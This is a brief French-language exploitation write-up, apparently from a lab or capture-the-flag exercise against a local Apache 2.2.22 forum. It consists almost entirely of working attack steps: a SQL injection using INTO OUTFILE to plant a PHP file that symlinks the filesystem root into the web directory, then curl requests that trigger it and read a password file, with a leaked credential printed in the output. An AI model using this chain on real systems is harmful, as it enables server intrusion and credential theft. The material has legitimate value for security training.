# Exploitation Apache 2.2.22 + SQLi → Symlink RCE

## 1 — Injection SQL pour écrire le payload PHP

```sql
SELECT '<?php symlink("/", "search.php"); echo "OK"; ?>'
INTO OUTFILE '/var/www/forum/templates_c/test3.php'
FIELDS TERMINATED BY '' ENCLOSED BY '' ESCAPED BY ''
LINES TERMINATED BY '';




curl -ks "https://192.168.56.101/forum/templates_c/test3.php"
# Réponse attendue : OK


curl -ks "https://192.168.56.101/forum/templates_c/search.php/home/LOOKATME/password"
# → lmezard:G!@M6f4Eatau{sF"


